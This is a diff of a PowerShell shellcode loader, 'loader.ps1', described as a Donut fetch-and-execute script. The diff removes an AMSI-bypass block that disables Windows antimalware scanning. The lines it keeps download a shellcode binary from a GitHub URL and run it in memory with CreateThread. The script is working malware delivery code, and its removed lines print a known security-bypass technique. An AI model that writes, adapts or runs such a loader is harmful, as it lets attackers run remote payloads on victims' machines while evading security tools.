@@ -1,19 +1,8 @@
-# loader.ps1 - Donut shellcode fetch & execute (fixed WaitForSingleObject)
-
-try {
-    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-        .GetField('amsiInitFailed','NonPublic,Static')
-        .SetValue($null,$true)
-} catch {
-    Write-Host "[!] AMSI bypass failed (probably already patched or not needed)"
-}
-
 $url = "https://github.com/MJ06-BP/bp/raw/refs/heads/main/shellcode.bin"
 
 try {
     $wc = New-Object Net.WebClient
     $shellcode = $wc.DownloadData($url)
-    Write-Host "[+] Downloaded $($shellcode.Length) bytes"
 } catch {
     Write-Host "[-] Download failed: $($_.Exception.Message)"
     exit
@@ -42,7 +31,7 @@ try {
     $thread = [Native.Win32]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$tid)
     if ($thread -eq [IntPtr]::Zero) { throw "CreateThread failed (error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))" }
 
-    Write-Host "[+] Thread created → executing shellcode"
+    Write-Host "[+] Executing shellcode"
     [Native.Win32]::WaitForSingleObject($thread, [uint32]::MaxValue)   # ← fixed line
 
     Write-Host "[+] Execution finished"
